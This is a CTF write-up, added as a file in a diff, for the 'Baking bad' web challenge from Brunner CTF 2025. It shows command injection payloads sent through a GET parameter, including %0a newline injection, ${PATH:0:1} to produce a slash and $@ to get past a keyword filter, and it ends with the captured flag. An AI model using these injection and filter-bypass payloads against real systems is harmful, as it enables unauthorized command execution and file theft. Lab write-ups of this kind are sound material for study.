@@ -1,0 +1,189 @@
+---
+title: Baking bad -  Brunner CTF 2025
+description: CTF write-up about an easy command injection vulnerability.
+tags:
+  - ctf
+  - command-injection
+  - web
+author: TeTo
+authorGithub: TeTo-O
+date: "August 23, 2025 4:22 PM"
+image: ""
+category: web
+---
+
+Created time: **August 23, 2025 4:22 PM**  
+Category: **web**  
+Last updated time: **September 23, 2025 4:23 PM**  
+Vuln type: **Command Injection**  
+Status: **Done**  
+CTF: **Brunner CTF**
+
+---
+
+## Challenge Description
+
+**Points:** 100  
+**Difficulty:** Easy  
+**Author:** 0xjeppe  
+
+This new kid on the block, Bake'n'berg, has taken over the market with some new dough that has 99.2% purity. Ours is not even 60%!
+
+Our bakers have been trying to come up with a new P2P recipe, trying all sorts of weird ingredients to raise the purity, but it's so costly this way.
+
+Luckily, the developers at Brunnerne have come up with a `bash -c 'recipe'` that can simulate the baking process.  
+This way we can test ingredients in a simulator to find ingredients that result in a higher purity — without wasting any resources.
+
+---
+
+## Analysis
+
+The page looks like a web app for checking the purity of some ingredients.
+
+The request being made is a **GET** with a parameter `ingredient=` which then returns the purity of the corresponding ingredient.
+
+<aside>
+📌 At this point, we can conclude with 99% certainty that we are dealing with a **Command Injection** vulnerability.
+</aside>
+
+---
+
+## Recommendations
+
+The proposed solution will therefore be based on injecting shell commands into the backend to obtain the flag.
+
+---
+
+## Exploitation
+
+First, let’s check if our assumption actually produces a result.
+
+We try with this simple payload:
+
+```http
+
+GET /?ingredient=\nls
+````
+
+We get the following error response from the server, but the request seems to have gone through:
+
+```html
+
+Illegal character detected!s
+```
+
+At this point I realize I haven’t considered URL encoding, so I try again like this:
+
+```http
+
+GET /?ingredient=%0als
+```
+
+And finally get this response:
+
+```txt
+
+No ingredient!
+index.php
+quality.sh
+statics
+```
+
+✅ **Injection successful**
+
+Now I just need to check in which directory the flag is located:
+
+```http
+
+GET /?ingredient=%0als%09..
+```
+
+And I get this response:
+
+```txt
+
+No ingredient!
+bakingbad
+html
+```
+
+Ok… I need to go further back, but how???
+
+I try a series of payloads:
+
+```http
+
+GET /?ingredient=%0als%09../..
+GET /?ingredient=%0als%09..%2f..
+GET /?ingredient=%0als%09..%252f..
+GET /?ingredient=%0a{ls,../..}
+GET /?ingredient=%0a{ls,..}|{ls,..}
+```
+
+No luck. I need to get `/` somehow without writing it explicitly:
+
+```http
+
+GET /?ingredient=%0a{ls,..${PATH:0:1}..${PATH:0:1}..}
+```
+
+Using `${PATH:0:1}` we obtain `/`, which repeated a few times allows us to discover the flag’s location:
+
+```txt
+
+No ingredient!
+bin
+boot
+dev
+etc
+flag.txt # found yey 🎯
+home
+lib
+lib.usr-is-merged
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+```
+
+Now I just need to replace `ls` with `cat`, right??
+
+```http
+
+GET /?ingredient=%0a{cat,..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}flag.txt}
+```
+
+Response:
+
+```html
+
+Illegal command detected!
+```
+
+Too good to be true 🥲
+
+After endless attempts and research I come across this filter command bypass `$@` which works like the backslash `\`:
+
+```http
+
+GET /?ingredient=%0a{c$@at,..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}flag.txt}
+```
+
+And finally:
+
+```txt
+
+No ingredient!
+brunner{d1d_1_f0rg37_70_b4n_s0m3_ch4rz?}
+```
+
+🎉 **Flagged** ✅
